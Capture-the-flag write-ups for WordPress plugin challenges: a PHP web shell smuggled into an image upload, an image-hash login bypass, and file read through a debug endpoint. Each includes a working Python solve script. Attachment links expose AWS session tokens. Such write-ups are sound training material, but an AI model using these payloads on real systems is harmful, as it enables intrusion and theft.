Here is my solve script to solve this challenge:

```python
import httpx
import asyncio
import re
import random

URL = "http://3.14.248.34:9019/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def make_user(self, user_login: str, user_pass: str, firs_name: str, last_name: str):
        return self.c.post("/wp-json/%F0%9F%8F%A0/%F0%9F%AA%A8/%F0%9F%97%AF%EF%B8%8F", data={"👤": user_login, "🔑": user_pass, "🥇": firs_name, "🏁": last_name})
    def upload_image(self, image: str, nonce: str):
        return self.c.post("/wp-json/%F0%9F%8F%A0/%F0%9F%AA%A8/%F0%9F%96%BC%EF%B8%8F", files={"🖼️": image}, data={"_wpnonce": nonce})
class API(BaseAPI):
    ...

async def main():
    api = API()
    username = "asdniqws"+str(random.randint(0, 100000))
    password = "asdniqws"+str(random.randint(0, 100000))
    res = await api.make_user(username, password, ".../.././", "")
    print(res.text)
    res = await api.c.post("/wp-login.php", data={
        "log": username,
        "pwd": password
    })
    res = await api.c.get("/wp-admin/")
    # get only nonce
    nonce = re.search(r"wpApiSettings.*nonce\":\"([a-f0-9]+)\"", res.text).group(1)
    print(nonce)
    # add mime of png
    mimpng = b"\xFF\xD8\xFF\xDB"
    mimpng += b"<?php system($_GET['cmd']); ?>"
    res = await api.upload_image(("tests.png.php", mimpng), nonce)
    url = res.json()['🖼️']
    print(url)
    res = await api.c.get(url+"?cmd=cat /*")
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_qBEpoQQ3.png)

# **Say Cheese and Authenticate**

## Challenge Information

Description

    Passwords are a thing of the past. Now with 'Say Cheese and Authenticate' you can allow your users to login via a secure login page by using an image instead of a password.

    by Savphill and Patchstack team

    NOTE: This is a fully white box challenge, no heavy brute force is needed.

    [http://3.14.248.34:9047/](http://3.14.248.34:9047/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/76eb8803-5a49-4260-8b13-b3bd9f2db26c/attachment_%285%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XLILSE23%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIHxLw1HfO2YMg7aWdCjHa50q7f7kfFdPllxqJjkmPMGuAiEA1PkTizBD7Gc%2BagA8vfkhg0yA6TGpNJrszaTGyFvHOmcqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDE54E32gP9bIOtff4CrcA3gMgghIh3hxCUCRt2sdrx9f1cEpi3BSo5wK1StmtSH91FzW2TZTZUtwE0MgbqidnIAz14RIK5oBowgSJBhK53nXSWK0MOME8ZlgEn2tVqESl8O%2BlH1vPnAX8mKdzLAphFT2pgd8gr9Rfw6Cro9wiFAShc0XnypegmF6AlonTt%2FBnVo6viHCGRKJtfFCUFAiXkyN6FxKYCPW33t9SRUjek%2FWn91wCpEtHD14VJmo4A3sYj6u9FVtCmSUWs182Z3jDoONRHPezBwxFTKK%2BqVvbTd8YuvapwL3RRrZUW%2FmdJhTqoOxhYuEzygzoWygE8zj1fal1TTeJHTgqO57ImOYNgrKnekdbsQsojGDo4RZMUVxLfWnumibUnqhbNbcw4N6WLhSEEpExmCg8R10F6VG1jJlSO5mamDQpe1oaiRcAM%2BZHbObnUZ%2F46KdPupWtsGjkZfkH6OyoQmbWkJ%2FnhZNdFG5vYYBAYVzHflmFh11Z5aokW0uZSN8f28vXYDExP1eAUz5ho81ZbQH3N7xzGMwg84daUfhiMo%2BSq1QTM2DfFFJUd318PBGCziIAWaNTdj815VGoC3BP0XrpmTnAHsEtZnkYR1EKzfMLicsE4T2lWwAJWhpvdYIQW5XTyGQMNOmwcEGOqUBol68gi5WeVpZAe1PSsMlzH4yV0CTzMqxRo%2B0b%2BP%2Fzjr75iq21Juu5yD09zQWS49RO%2BAVWeWNz5AknzR%2FbB3TSh4OIg59RYrBxMoMUc4j8SADsVjExCMeRw3uW%2B7EBqLG1DgksUyP85PfPjvNBjddD2ku4apEl9fOCUy1Fr5%2F0i3qiLHKnpFiePoNhv0iiRupM9XOVUDCG45NC4iqX9nkRIWWROsR&X-Amz-Signature=adecf35bf318c510f89745874a9e0ef2e00bc7cc24aa0b34a5bb13b16a5961bc&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, there's a plugin that authenticates users using an image. Here's a portion of the code:

```php
add_action('wp_ajax_nopriv_say_cheese_handle_image_login', 'say_cheese_handle_image_login');
function say_cheese_handle_image_login() {
    if (isset($_GET["imagelogin"])) {

        $message = '';

        // Handle form submission
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'])) {
            $username = sanitize_text_field($_POST['username']);
            $uploaded_image = $_FILES['image'] ?? null;
            if (say_cheese_upload_and_authenticate($username, $uploaded_image)) {
                wp_redirect(admin_url());
                exit;

...snip...
function say_cheese_upload_and_authenticate($username, $uploaded_image) {
    $user = get_user_by('login', $username);
    if (!$user || !$uploaded_image) return false;


    $allowed_mime_types = ['image/png', 'image/jpeg'];
    $uploaded_mime_type = mime_content_type($uploaded_image['tmp_name']);

    if (!in_array($uploaded_mime_type, $allowed_mime_types)) {
        return false; // Reject the file if it's not PNG or JPEG
    }

    // Encrypt the username using Say Cheese Encryption
    $encrypted_username = say_cheese_encrypt($username, intval(getenv("HOW_MANY")));

    $image_path = WP_CONTENT_DIR . '/uploads/say_cheese_images/' . $encrypted_username . '.png';

    if (file_exists($image_path)) {
        $stored_image_hash = hash_file('md5', $image_path);
        $uploaded_image_hash = md5_file($uploaded_image['tmp_name']);
        if ($stored_image_hash === $uploaded_image_hash) {
            if($user->ID !== 1){
                wp_set_auth_cookie($user->ID);
                return true;
            }

        }
    }
    return false;
}
```

The plugin will automatically create a user with the following code:

```php
register_activation_hook(__FILE__, 'create_user_and_assign_image');

function create_user_and_assign_image() {
    // Step 1: Create the 'johnstilton1' user if not already exists
    $how_many = 11;
    $username = 'johnstilton1'; // The fixed username
    $email = 'johnstilton1@example.com'; // Change the email if needed
...snip...
```

## Exploitation

To solve this challenge, we just need to authenticate as a user using the image from the real server, which we can access at `/wp-content/plugins/add-user/pp.png`. After that, we can check the path of the flag media by accessing `/wp-json/wp/v2/media/`.

## Obtaining the Flag

Here is my solve script to solve the challenge:

```python
import httpx
import asyncio

# URL = "http://localhost:9047"
URL = "http://3.14.248.34:9047/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def say_cheese_handle_image_login(self, imagelogin, username, image):
        return self.c.post("/wp-admin/admin-ajax.php", data={
            "username": username,
        }, files={
            "image": image,
        }, params={
            "action": "say_cheese_handle_image_login",
            "imagelogin": imagelogin,
        })

class API(BaseAPI):
    ...

async def main():
    api = API()
    image = await api.c.get("wp-content/plugins/add-user/pp.png")
    res = await api.say_cheese_handle_image_login(True, "johnstilton1", ("image", image.content, "image/png"))
    # print(res.text)
    # print(res.status_code)
    # print(res.headers)
    res = await api.c.get("/wp-json/wp/v2/media/")
    print(res.json()[0]['guid']['rendered'])

if __name__ == "__main__":
    asyncio.run(main())
```

Output

![](./imgs/image_6MHUirSu.png)

flag:

![](./imgs/image_vXL2nmNA.png)

# **Half Baked**

## Challenge Information

Description

    My site is a little... undercooked. The apprentice is developing a new baking recipe repo for my bakery and it looks like they decided to put a batch in before the oven was pre-heated!

    by ghsinfosec

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed, however, some educated guessing may apply.

    [http://3.14.248.34:9035](http://3.14.248.34:9035/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/f60405cf-9acf-4f16-8f65-f810aa1ab2c2/attachment_%283%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZOG2OW37%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIEn7ncrjBy1ywUXu1axVze00NjxvTK%2FR9UbAyoZ9m0wfAiEAgTDxA1rhz5kkh4eKEOqXFUezU%2Bc%2BJaYQWtPZiEUw%2BTYqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKuPdcv5NhMsacG6fSrcAwHTDa9aimbhpyWdtOOSYwKafFyprQAUtrhkcLyFhRlhHZMN7Hr4R631o6aeKrf1ACsnw30Vx32KWa8svbKmSDwCaWDnMj9kfO4TjhBqeMLGBrkG7pdXZCivXuXoe3EV4NfTwvejR6ssf6xRVDNvUdq4OVFX%2BMmncpUyI1n3EuK7cT7mR5dV5QlItvyOAWRhv3HBFUGS7Var%2FPPLz6YInY36zErQubfzCeUnkAfpvpmk%2Bn01NFM418RL3%2Fatuv9sLnKvJzwK%2FFkj9IbCeYWcqvI8ft1oLPNTTGk2FsTxHSdvGuA6hASDPTZgN%2F2htSlNzKBHxGWCOVdROtzFK%2Fpqg33TEV0qwkwa5FoH1fLaU3jmVxjZeXhLFRkOehLCoK%2FHwoPofO0K6vzwVN5QKRBrFMRrTL3N9zSyGVs3BhM8OYAiZmlVlkK90fo8zjV849rGYzEIzc%2FcCyGJxbE0T9qPNtyJ%2Fibq%2BescTNe1JD0MjHatmdt7uRJITIn%2FuWjL28UHoa7zNGEcw1yyCLLyN26Gceq0KoGRQehJUIYAeiu4kBMZa2cUcZSiqKZ4%2FYbXnUFPJFsyZ6fRXu%2BRuWYyNXIdBIMutXuo9FYQ1y3Zj8uvqQ%2F2RzcW7bVFthbADEZuMPGmwcEGOqUBcDCjDBAkAVLTx%2BgGTGgQ3xPBmt1rEOr0oeAA4Fw72nMvPld5N2kUOiD0VM986uiDf%2FujmsqJOMFNpm58fR92J1lzaJ3V9i1%2BwNiouJWi55A1tdqdpu4BTGxAei%2FkvpFiornyGn7Vf6mHQezgy3UBF%2Ftu1HyeIP%2F%2FdRg4pnXjmn0MHrSEcSP2rsC74VDbVt7BYUWUxIE3GXRzdTSkT50FtL3mLHES&X-Amz-Signature=c699d22701bc5d27a4d4e28a69f33d6aacd720a84106eddedb17ae575b8e4125&X-Amz-SignedHeaders=host&x-id=GetObject)

## Exploitation

To exploit this challenge, we first need to authenticate by obtaining the encoded credentials from `server-given/challenge-custom/message.txt` on the real server. We can retrieve this information by calling the debug REST API endpoint:

```python
        register_rest_route('half-baked/v1', '/debug', array(
            'methods' => 'GET',
            'callback' => array(self::class, 'activate_debug'),
            'permission_callback' => '__return_true',
        ));
        ...snip...
    public static function activate_debug($request) {
        $contents = file_get_contents('/message.txt');
        ...snip...
        return rest_ensure_response([
            'status' => 'error',
            'message' => array(
                'info' => 'Sorry, debug mode failed to launch',
                'data' => $contents,
            ),
        ], 401);
    }

```

Then, we use the following key and IV to decode the hash:

```php
// $key = '379444613f1519968b44a36fa51c544a';
// $iv = 'e59fc938f4eb1370bb9fef8a8b495bac';
```

Using CyberChef, we can decode the encoded credentials. Here's the result:

![](./imgs/image_m1MCmnyX.png)

After obtaining the credentials and logging in, we need to call `activate_debug` again to set our transient:

```php
    public static function activate_debug($request) {
        $contents = file_get_contents('/message.txt');
        $debug = $request->get_header('x-debug-mode');
        $user_id = get_current_user_id();
        $user_data = get_userdata($user_id);

        if($debug && $user_id) {
            $user_data->add_cap('edit_posts');
            set_transient('half_baked_dev_' . $user_id, ['edit_posts'], 60); // transient is good for 60 seconds

            return rest_ensure_response(array(
                'status' => 'success',
                'message' => array(
                    'info' => 'Debug mode activated',
                    'test_entry' => array(
                        'author' => 'headbaker',
                        'note' => 'Use the info in /note.txt for final automation testing',
                        'entry_data' => 'blah blah ingredients blah... mix the stuff, do the thing...',
                    ),
                ),
            ));
        }
```

Next, we use the `test_post_recipe` function to achieve arbitrary file read and read the contents of `note.txt`:

```php
    public static function test_post_recipe($request) {
        $filename = $request->get_header('x-file');
        $user_id = get_current_user_id();
        $user_caps = get_transient('half_baked_dev_'. $user_id);

        if(is_array($user_caps) && in_array('edit_posts', $user_caps)) {
            if($filename) {
                $file = file_get_contents($filename);
```

After retrieving the contents of `note.txt`, use that information to get the flag using the `get_flag` function:

```php
    public static function get_flag($request) {
        $key = getenv('SECRET_INGREDIENT');
        $header = $request->get_header('x-secret-key');

        if($key === $header) {
            return rest_ensure_response(array(
                'status' => 'success',
                'flag' => getenv('X_FLAG'),
            ));
        }
```

## Obtaining the Flag

Here is my solve script to solve this challenge:

```python
import httpx
import asyncio

URL = "http://3.14.248.34:9035/"
# URL = "http://localhost:9035/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def debug(self):
        return self.c.get("/wp-json/half-baked/v1/debug", headers={"x-debug-mode": "1"})
    def postrecipe(self, file):
        return self.c.post("/wp-json/half-baked/v1/post-recipe", headers={"x-file": file})
    def auto_login(self, username):
        return self.c.post("/wp-json/half-baked/v1/auto-login", data={"username": username})
    def get_flag(self, secret):
        return self.c.get("/wp-json/half-baked/v1/get-flag", headers={"x-secret-key": secret})

class API(BaseAPI):
    ...

async def main():
    api = API()
    """
    https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')AES_Decrypt(%7B'option':'Hex','string':'379444613f1519968b44a36fa51c544a'%7D,%7B'option':'Hex','string':'e59fc938f4eb1370bb9fef8a8b495bac'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=OWI1MGFjNjhlMjBmZTVjMmY5OTFmYmY5YzUwZDMwNzM4ZGZiMDFjYzIxODA4OTFlZWU0NTY2Y2NmYWQ4YTRhY2M0ODI1M2VkYTQ0ZGQwZTA1ODdhNWNiYWY3N2JhNmQzYWM5YmFkNDgzNGU3MGM0NzczODU4YWUyZDE1NjI5OGI5MDFhM2U4ZDFhYWI4Nzg1ZGVlYzM4NjIzNDdjMzJjMg
    """
    res = await api.c.post("/wp-login.php", data={
        "log": "apprentice",
        "pwd": "891b90c73e9bdf2fe6f284d6f133ae49"
    })
    res = await api.debug()
    res = await api.postrecipe(f"/note.txt")
    print(res.text)
    secret = "kosher"
    res = await api.auto_login("admin")
    print(res.headers)
    res = await api.get_flag(secret)
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_9IcRrNpV.png)

# **Something**

## Challenge Information

Description

    No comment, it's something.

    by Patchstack team

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9055](http://3.14.248.34:9055/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/b6701b06-e496-4868-9463-96460d65390e/attachment_%284%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X4SSSMBH%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112634Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIDrl%2FRyF09YvMs05kJuQajbJZRmLnu8sV9mkclIsd6dBAiEAhWwtQ%2Bl4b0ggeioGFEcxUXeuU2nvpX7rFMat%2F7KqNgcqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOAmocCfR%2FZwXkbkCyrcA8FxANqTtS3LMlj9QrNAdR%2FLfkOgVQtbZvoHXIeksr6WKmjj%2FxyqRYea5J%2F0tmZ9WLEqLSr32ytJavTYxOKsfu%2FbLMe9A7B%2FJXL5lpQH4aQvYqFCamqZvwM0%2FHVnE6OTQtD2vHjKo6ouERD6CAkS%2B4I%2FWlrteIaq5KT%2BIINnBBaSYa2FwatgRqVEDrQ3kfh6VxSoD3qr9VL6Tc4leGkyPdZvUFBIJuGWvqIL4t1dkdguMPjmmryNN42IjrkwF2SDpe6lHP1y%2F83QjctOq9PLf9SisQiF1u%2Bng%2FBWJZmE3ejpKonzmRcuCt9O6AQWS44zgw7eA%2FynKbebiRpb8pkURFy8%2B0aHQnzUz48tHx7vKlNXO05TmNnNanXRZrml3sJvSzxF0RsLHtABug0SV8nle%2FU5MpExk73xgb28fH8CefrfIIlZRwkq9K%2FqCyvzCAAtV0l%2B%2Ff5OBgb3vpa4YRjElGmwTOnlmuwnOH4cWuP2NLuQlyUv%2BXC6x9%2BgiqCGeDiDwDCUlm371CJNy4c1BZVYpUpHQ%2BbaEVT3quMItX8GmleVS8FvSVScCSzsPV47%2FWEOa1OqwbCNQdD4j11HENPOukbiaSlAe2NtJlvHtjw4ShahfwLlJW%2BBJxBscrgcMN2mwcEGOqUBdozaC1WAhReSfcBQvIhN9sLyvPMborC6AC3L8Uek8PwgpPiW4o%2BFKT3R0ATQYlidNDLRgedzPfZG8uRFvQoK5KuobUMB7y1ViFbCwisPj88riu7mISPbkzt80NWAmj4YhjJKZ7YOBwXSJbJ%2BGJRMezdE7g18zFcdKstB4%2F4PGLJlOn%2BaTRJDqyb9ChetGG%2FgZ1ju290rbfEVaDdHFSJQkCT8hpCD&X-Amz-Signature=0a0f1acdf9f9788ff487656480e8e2094659e6cb0d4d9285369274105cc34e01&X-Amz-SignedHeaders=host&x-id=GetObject)

## Exploitation

TL;DR to solve this challenge, we can use a zero-day exploit from a \[REDACTED] plugin to read the post title. Before that, you need to register to gain contributor access using the following code:

```php
add_action("wp_ajax_nopriv_register_user", "register_user");

function register_user(){
    $userdata = array(
        'user_login' => sanitize_text_field($_POST["username"]),
        'user_pass' => sanitize_text_field($_POST["password"]),
        'user_email' => sanitize_text_field($_POST["email"]),
        'role' => 'contributor',
    );

    wp_insert_user($userdata);
    echo "user created";
}
```

## Obtaining the Flag

![](./imgs/proof_rcDJHBxe.jpg)
